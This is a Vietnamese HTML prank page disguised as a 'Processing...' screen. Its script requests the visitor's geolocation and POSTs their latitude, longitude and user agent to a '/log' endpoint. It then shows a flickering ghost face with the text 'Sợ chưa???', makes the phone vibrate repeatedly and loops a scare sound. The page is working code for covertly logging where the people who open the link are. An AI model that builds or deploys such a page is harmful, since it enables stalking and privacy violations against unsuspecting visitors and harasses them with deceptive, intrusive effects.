<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Đang xử lý...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
      font-family: 'Arial', sans-serif;
      color: red;
      text-align: center;
    }

    .ghost-face, .scare-text {
      display: none;
    }

    .ghost-face {
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%) scale(1.1);
      max-width: 60%;
      animation: flicker 0.3s infinite, shake 0.4s infinite;
    }

    .scare-text {
      position: absolute;
      top: 75%;
      left: 50%;
      transform: translateX(-50%);
      font-size: 3em;
      font-weight: bold;
      color: red;
      text-shadow: 0 0 15px red;
      animation: pulse 1s infinite;
    }

    @keyframes flicker {
      0% { opacity: 1; }
      50% { opacity: 0.2; }
      100% { opacity: 1; }
    }

    @keyframes shake {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      25% { transform: translate(-52%, -48%) rotate(2deg); }
      50% { transform: translate(-48%, -52%) rotate(-2deg); }
      75% { transform: translate(-50%, -50%) rotate(1deg); }
      100% { transform: translate(-50%, -50%) rotate(-1deg); }
    }

    @keyframes pulse {
      0% { transform: translateX(-50%) scale(1); }
      50% { transform: translateX(-50%) scale(1.1); }
      100% { transform: translateX(-50%) scale(1); }
    }
  </style>
</head>
<body>

<img class="ghost-face" id="ghost" src="https://i.pinimg.com/originals/4c/91/ea/4c91eaa27611819b9052c44bb8a4e705.png" alt="Ghost Face" />
<div class="scare-text" id="text">Sợ chưa???</div>

<audio id="scareSound" loop>
  <source src="https://www.fesliyanstudios.com/play-mp3/4386" type="audio/mpeg">
</audio>

<script>
  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // Gửi về server
      fetch("/log", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          latitude: lat,
          longitude: lon,
          userAgent: navigator.userAgent
        })
      });

      // Hiện mặt ma và chữ
      document.getElementById("ghost").style.display = "block";
      document.getElementById("text").style.display = "block";

      // Rung máy
      if (navigator.vibrate) {
        setInterval(() => {
          navigator.vibrate([100, 200, 300]);
        }, 1500);
      }

      // Phát âm thanh
      document.getElementById("scareSound").play();
    },
    err => {
      console.warn("Không lấy được vị trí:", err);
    }
  );
</script>

</body>
</html>
